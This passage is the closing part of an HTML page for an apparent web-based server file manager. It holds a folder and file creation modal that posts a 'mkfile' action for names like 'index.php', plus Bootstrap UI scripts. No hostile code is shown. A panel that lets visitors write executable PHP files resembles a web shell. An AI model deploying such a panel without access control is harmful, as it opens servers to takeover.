                            <i class="bi bi-folder-plus me-1"></i> Create Folder
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- New File Modal -->
    <div class="modal fade" id="newFileModal" tabindex="-1">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header border-0 pb-0">
                    <h5 class="modal-title fw-bold">
                        <i class="bi bi-file-plus text-primary me-2"></i>
                        Create New File
                    </h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <form method="post">
                    <div class="modal-body">
                        <input type="hidden" name="action" value="mkfile">
                        <div class="mb-3">
                            <label class="form-label fw-semibold">File Name</label>
                            <input type="text" name="filename" class="form-control form-control-modern" 
                                   placeholder="e.g., index.php, style.css" required>
                            <small class="text-muted mt-2 d-block">
                                <i class="bi bi-info-circle"></i> Include the file extension (e.g., .txt, .php)
                            </small>
                        </div>
                    </div>
                    <div class="modal-footer border-0 pt-0">
                        <button type="button" class="btn btn-modern btn-modern-outline" data-bs-dismiss="modal">
                            Cancel
                        </button>
                        <button type="submit" class="btn btn-modern btn-modern-primary">
                            <i class="bi bi-file-plus me-1"></i> Create File
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    
    <!-- Custom JavaScript -->
    <script>
        // Auto-hide alerts after 5 seconds
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(function() {
                const alerts = document.querySelectorAll('.alert');
                alerts.forEach(function(alert) {
                    const bsAlert = new bootstrap.Alert(alert);
                    bsAlert.close();
                });
            }, 5000);
        });

        // Prevent double form submission
        const forms = document.querySelectorAll('form');
        forms.forEach(function(form) {
            form.addEventListener('submit', function() {
                const submitBtn = form.querySelector('[type="submit"]');
                if (submitBtn && !submitBtn.disabled) {
                    submitBtn.disabled = true;
                    const originalText = submitBtn.innerHTML;
                    submitBtn.innerHTML = '<span class="spinner-border spinner-border-sm me-1" role="status" aria-hidden="true"></span> Processing...';
                    
                    setTimeout(() => {
                        submitBtn.disabled = false;
                        submitBtn.innerHTML = originalText;
                    }, 3000);
                }
            });
        });

        // File upload preview
        const fileInput = document.querySelector('input[type="file"][multiple]');
        if (fileInput) {
            fileInput.addEventListener('change', function() {
                const fileCount = this.files.length;
                if (fileCount > 0) {
                    const parent = this.closest('form');
                    let existingBadge = parent.querySelector('.file-count-badge');
                    
                    if (existingBadge) {
                        existingBadge.remove();
                    }
                    
                    const badge = document.createElement('span');
                    badge.className = 'badge bg-primary rounded-pill ms-2 file-count-badge';
                    badge.innerHTML = '<i class="bi bi-files me-1"></i> ' + fileCount + ' file(s) selected';
                    this.parentNode.appendChild(badge);
                }
            });
        }

        // Add animation delay to table rows
        const tableRows = document.querySelectorAll('tbody tr');
        tableRows.forEach(function(row, index) {
            row.style.animationDelay = (index * 0.03) + 's';
        });

        // Smooth hover effects for buttons
        const btns = document.querySelectorAll('.btn');
        btns.forEach(btn => {
            btn.addEventListener('mouseenter', function(e) {
                this.style.transform = 'translateY(-2px)';
            });
            btn.addEventListener('mouseleave', function(e) {
                this.style.transform = 'translateY(0)';
            });
        });
    </script>
</body>
</html>
